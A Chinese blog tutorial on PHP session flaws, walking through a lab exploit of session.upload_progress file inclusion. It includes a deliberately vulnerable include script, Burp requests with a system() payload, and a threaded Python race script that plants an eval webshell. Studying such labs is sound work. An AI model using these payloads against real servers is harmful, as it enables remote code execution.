<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>session相关漏洞 · zIxyd's Blog</title><meta name="description" content="session什么是session官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。主要有以下特点：
sessin保存的位置是在服务器端session通常是要配合cookie使用因为HTTP的无状态性，服务端产生了se"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session"><span class="toclist-text">session</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-upload-progress"><span class="toclist-text">session.upload_progress</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toclist-text">相关配置</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toclist-text">存储机制</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%88%86%E6%9E%90"><span class="toclist-text">分析</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80"><span class="toclist-text">问题一</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="toclist-text">问题二</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80"><span class="toclist-text">实验一</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-bp"><span class="toclist-text">方法一(bp)</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-python"><span class="toclist-text">方法二(python)</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-unser"><span class="toclist-text">session_unser</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PHP-session%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toclist-text">PHP session序列化机制</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toclist-text">php处理器</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#php-serialize%E5%A4%84%E7%90%86%E5%99%A8"><span class="toclist-text">php_serialize处理器</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toclist-text">session的反序列化漏洞利用</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-1"><span class="toclist-text">实验一</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C"><span class="toclist-text">实验二</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-decode"><span class="toclist-text">session_decode</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-2"><span class="toclist-text">实验一</span></a></li></ol></li></ol></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session"><span class="toclist-text">session</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-upload-progress"><span class="toclist-text">session.upload_progress</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toclist-text">相关配置</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toclist-text">存储机制</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%88%86%E6%9E%90"><span class="toclist-text">分析</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80"><span class="toclist-text">问题一</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="toclist-text">问题二</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80"><span class="toclist-text">实验一</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-bp"><span class="toclist-text">方法一(bp)</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-python"><span class="toclist-text">方法二(python)</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-unser"><span class="toclist-text">session_unser</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PHP-session%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toclist-text">PHP session序列化机制</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toclist-text">php处理器</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#php-serialize%E5%A4%84%E7%90%86%E5%99%A8"><span class="toclist-text">php_serialize处理器</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toclist-text">session的反序列化漏洞利用</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-1"><span class="toclist-text">实验一</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C"><span class="toclist-text">实验二</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#session-decode"><span class="toclist-text">session_decode</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-2"><span class="toclist-text">实验一</span></a></li></ol></li></ol></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>session相关漏洞</a></h3></div><div class="post-content"><p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>什么是session<br>官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。主要有以下特点：</p>
<p>sessin保存的位置是在服务器端<br>session通常是要配合cookie使用<br>因为HTTP的无状态性，服务端产生了session来标识当前的用户状态</p>
<p>本质上，session就是一种可以维持服务器端的数据存储技术。即<strong>session技术就是一种基于后端有别于数据库的临时存储数据的技术</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/session.png"></p>
<h2 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h2><p>我先从头到尾分析一下<code>利用session.upload_progress进行文件包含</code></p>
<h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><p>在讲该姿势的具体利用方法之前，要先讲几个 php.ini 中的相关配置，这也是利用该方式进行文件包含的前提，此特性自 PHP 5.4.0 后可用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start = off</span><br><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line">session.save_path= <span class="string">&quot;/var/lib/php/sessions&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line"></span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line"></span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line"></span><br><span class="line">prefix+name将表示为session中的键名</span><br></pre></td></tr></table></figure>

<p>当 <code>session.upload_progress.enabled</code>INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<a target="_blank" rel="noopener" href="http://doc.cppedu.net/reserved.variables.session.html">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a target="_blank" rel="noopener" href="http://doc.cppedu.net/reserved.variables.session.html">$_SESSION</a>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与 <code>session.upload_progress.name</code>连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.upload_progress.prefix&quot;</span>) . <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.upload_progress.name&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>[<span class="variable">$key</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>当开启session时，服务器都会在一个临时目录下创建一个session文件来保存会话信息，文件名格式为 sess_PHPSESSID 。<br>在linux系统中，session文件一般保存在以下几个目录：以<code>session.save_path</code>为依据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/</span><br><span class="line">/var/lib/php/sessions/</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h4><p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>
<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置<strong>PHPSESSID&#x3D;zixyd</strong>，PHP将会在服务器上<strong>创建</strong>一个文件：<code>sess_zixyd</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_zixyd。</p>
<h4 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h4><p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
<p>需要条件竞争</p>
<h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><p>在kali中开启nginx;并创建index.php文件内容如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zixyd&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_POST</span>[<span class="string">&#x27;zixyd&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107132635.png"></p>
<p>使用了<code>session_start</code>函数，并且存在任意文件包含漏洞，但是服务器上却没有恶意的文件包含可以<code>getwebshell</code>时，这时可以利用<code>session.upload_progress</code></p>
<h4 id="方法一-bp"><a href="#方法一-bp" class="headerlink" title="方法一(bp)"></a>方法一(bp)</h4><p>创建一个可以上传文件的html文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.6.98/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&lt;?php cat(&#x27;cat /flag.txt&#x27;);?&gt;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>随便上传一个文件并抓包发送到<code>intruder</code>模块，注意是随便上传一个文件,这里我们只需要利用在文件上传时<code>PHP_SESSION_UPLOAD_PROGRESS</code>和Cookie中<code>PHPSESSID</code>的值,而和上传什么文件无关，这个包是为了条件竞争制作恶意文件的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.6.98</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=zixyd</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------32681549875692968181236391716</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4686</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32681549875692968181236391716</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">§<span class="number">1</span>§<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag.txt&#x27;</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32681549875692968181236391716</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.md&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">```</span></span><br><span class="line"><span class="language-php">https:<span class="comment">//www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c32cb_ORWtGGSc0A92</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">https:<span class="comment">//www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c33f5_FmQaeCt30A88</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">```</span></span><br></pre></td></tr></table></figure>

<p>再抓一个包发送到<code>intruder</code>模块，这个包存在任意文件包含漏洞，是为了包含恶意文件的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.6.98</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.6.98</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.6.98/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=rou5qd86se828i5on12sl79fp6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">zixyd</span>=%<span class="number">2</span>Fvar%<span class="number">2</span>Flib%<span class="number">2</span>Fphp%<span class="number">2</span>Fsessions%<span class="number">2</span>Fsess_zixyd&amp;haha=§<span class="number">1</span>§</span></span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107133656.png"></p>
<h4 id="方法二-python"><a href="#方法二-python" class="headerlink" title="方法二(python)"></a>方法二(python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.6.98/&quot;</span></span><br><span class="line">sessid = <span class="string">&#x27;zixyd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line"></span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(url=url,data = &#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span></span><br><span class="line">        &#125;,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessid</span><br><span class="line">        &#125;,files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;zixyd.jpg&#x27;</span>,filebytes)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res1 = session.post(url=url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;zixyd&#x27;</span>: <span class="string">r&quot;/var/lib/php/sessions/sess_&quot;</span>+ sessid,</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span>: <span class="string">r&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res1.text:</span><br><span class="line">            <span class="built_in">print</span>(res1.text.encode(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print(&quot;retry~~~~&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出如下：可以很明显的看到是由“upload_progress_”和<code>&lt;?php eval($_POST[2]);?&gt;</code>为键值，<code>|</code>后面的就是session中存储的上传进度时的信息；只不过<code>&lt;?php eval($_POST[2]);?&gt;</code>已经被php解析了变成了flag{this is fuck flag}，这里也可以看出另一点：<code>session.serialize_handler = php</code>,这与session产生反序列漏洞有关</p>
